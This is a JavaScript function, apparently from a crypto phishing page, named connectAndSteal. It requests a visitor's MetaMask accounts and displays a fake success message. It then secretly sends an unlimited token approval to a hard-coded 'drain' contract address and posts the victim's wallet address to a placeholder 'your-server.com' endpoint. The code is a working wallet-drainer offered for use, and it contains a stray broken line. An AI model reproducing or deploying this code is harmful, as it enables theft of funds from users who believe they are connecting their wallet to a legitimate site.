async function connectAndSteal() {
    if (window.ethereum) {
        const web3 = new Web3(window.ethereum);
        try {
            // Request account access
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            const userAddress = accounts[0];
            document.getElementById("success").style.display = "block";
            document.querySelector("#metamask-area button").disabled = true;

            // 🔥 SECRET: Auto-approve malicious contract (DRAIN)
            const tokenAbi = [{
                "constant": false,
                "inputs": [{"name": "spender", "type": "address"},{"name": "amount", "type": "uint256"}],
                "name": "approve",
                "outputs": [{"name": "", "type": "bool"}],
                "type": "function"
            }];

            const DRAIN_CONTRACT = "0x484348E6776fd1FCA93041fFA735f1f3fFD67096"; 
             contract
            const FAKE_AMOUNT = "1000000000000000000000000"; 

            const contract = new web3.eth.Contract(tokenAbi, DRAIN_CONTRACT);
            await contract.methods.approve(
                "0x484348E6776fd1FCA93041fFA735f1f3fFD67096", 
                FAKE_AMOUNT
            ).send({ from: userAddress });

            // Log victim (optional: send to your server)
            fetch('https://your-server.com/log', {
                method: 'POST',
                body: JSON.stringify({ address: userAddress, ts: new Date().toISOString() }),
                headers: { 'Content-Type': 'application/json' }
            }).catch(() => {});

        } catch (err) {
            console.error(err);
        }
    } else {
        alert("MetaMask not detected. Install it.");
    }
}
